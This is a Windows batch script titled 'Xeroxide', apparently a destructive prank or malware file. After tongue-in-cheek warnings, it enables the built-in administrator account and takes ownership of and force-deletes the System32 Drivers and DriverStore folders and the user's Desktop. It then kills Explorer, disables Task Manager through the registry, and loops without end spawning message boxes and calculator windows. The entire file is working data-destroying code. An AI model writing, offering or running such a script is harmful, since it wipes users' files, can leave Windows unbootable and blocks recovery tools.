@echo off
net user administrator /active:yes
title Xeroxide
echo dont run this please ur pc will die
pause
cls
echo Please man dont ask me for help if you run this
pause
cls
takeown C:\Users\%USERNAME%\Desktop
takeown /f /s /q C:\Windows\System32\Drivers
takeown /f /s /q C:\Windows\System32\DriverStore
del /f /s /q C:\Windows\System32\Drivers
del /f /s /q C:\Windows\System32\DriverStore
del /f /s /q C:\Users\%USERNAME%\Desktop
timeout 1
cd %temp%
echo x=msgbox ("h̷̨̼͎̊̀͑̓͒̽͐̈̎̀̄͆̌̓́̾̾̿̆̽̀̈́͛̇̈̀̽̋̂͘̚͝a̵̳̱͎͔̫̦̭͙̎̊͋̾͗̔͆̋̀̈́͛̄͆̐̐̎̑̃͗͒̅̾̒̔̾͐̅̈́̉̑̉̓̓͆͌̔̇̉̅̂͘͜͝͝͠͠ḩ̷̡̡̧̪̟͇̪̦̭͔͚̟̖͔͍͋̽͊̉̋̓̓̐͋̋̆̓̀̈̉̉̀͋͆̀͛͋̊͑̄͌̆̉̌͂̐̌̾̈́̚͜͠͝͠͝͠a̵̡̢̛̫͔̻̮͚̼̦̰͈͔̞̮̭̻̙͓̞̞̠̜̪̟̭̖̬͕̥̤̟͛̓̇̎́͑̈́̀̂̋̈́̾̂̈́͋̈́̄̀̀̍͑̌̔̚͘͜͠͠͝͝ͅh̸̛̛̪̣̪͖̱̽͊̅͂̿̀̆̑̔̿̅̀̈́͝͝͝a̴̢̡̛̛̩̻͎͚͕̟̰͕̦̅̏͑̉̏̄́͊͐̌̽̀͗̀́̈̾̀̒̈́͆͒͒̊̒̈́̿͂͋͒̚̕͠ḩ̵̨̢̢̛̱̜̞͓̣̥̱͙͙͖̥̹̬̺̮̻̩̜͔͓̲̟͖̤̌̋̓̐̿̏̓̏̽̊̏͛́͐͛̅͆͑̾̓͑͒͘̚͜͠͝͝ͅą̷̧̨̧̢̛̛̙̖͍͖̗̳͖̰͓̳̳̟̻̻͚̞̬͇̩͔̦̪̦͎̬͇̟͇̮̗̻͓̝̝̩͖̹͚̫̑̆̓̈́̀͒̋̀̇͐̈́͌̂̎̃͛͑̄̀͊̃͛̄̔̀̓̔͐̽̑̓̋͆̓̊́̾̚̕̕͜͜͠͝ͅ",2+16,"Bad Decision")>>hehe.vbs
start hehe.vbs
echo x=msgbox ("h̷̨̼͎̊̀͑̓͒̽͐̈̎̀̄͆̌̓́̾̾̿̆̽̀̈́͛̇̈̀̽̋̂͘̚͝a̵̳̱͎͔̫̦̭͙̎̊͋̾͗̔͆̋̀̈́͛̄͆̐̐̎̑̃͗͒̅̾̒̔̾͐̅̈́̉̑̉̓̓͆͌̔̇̉̅̂͘͜͝͝͠͠ḩ̷̡̡̧̪̟͇̪̦̭͔͚̟̖͔͍͋̽͊̉̋̓̓̐͋̋̆̓̀̈̉̉̀͋͆̀͛͋̊͑̄͌̆̉̌͂̐̌̾̈́̚͜͠͝͠͝͠a̵̡̢̛̫͔̻̮͚̼̦̰͈͔̞̮̭̻̙͓̞̞̠̜̪̟̭̖̬͕̥̤̟͛̓̇̎́͑̈́̀̂̋̈́̾̂̈́͋̈́̄̀̀̍͑̌̔̚͘͜͠͠͝͝ͅh̸̛̛̪̣̪͖̱̽͊̅͂̿̀̆̑̔̿̅̀̈́͝͝͝a̴̢̡̛̛̩̻͎͚͕̟̰͕̦̅̏͑̉̏̄́͊͐̌̽̀͗̀́̈̾̀̒̈́͆͒͒̊̒̈́̿͂͋͒̚̕͠ḩ̵̨̢̢̛̱̜̞͓̣̥̱͙͙͖̥̹̬̺̮̻̩̜͔͓̲̟͖̤̌̋̓̐̿̏̓̏̽̊̏͛́͐͛̅͆͑̾̓͑͒͘̚͜͠͝͝ͅą̷̧̨̧̢̛̛̙̖͍͖̗̳͖̰͓̳̳̟̻̻͚̞̬͇̩͔̦̪̦͎̬͇̟͇̮̗̻͓̝̝̩͖̹͚̫̑̆̓̈́̀͒̋̀̇͐̈́͌̂̎̃͛͑̄̀͊̃͛̄̔̀̓̔͐̽̑̓̋͆̓̊́̾̚̕̕͜͜͠͝ͅ"2+16"Xeroxide")>>xeroxide120.vbs
taskkill /f /im explorer.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
timeout 1
:x
start xeroxide120.vbs
start calc
echo BUZZ OFF
goto x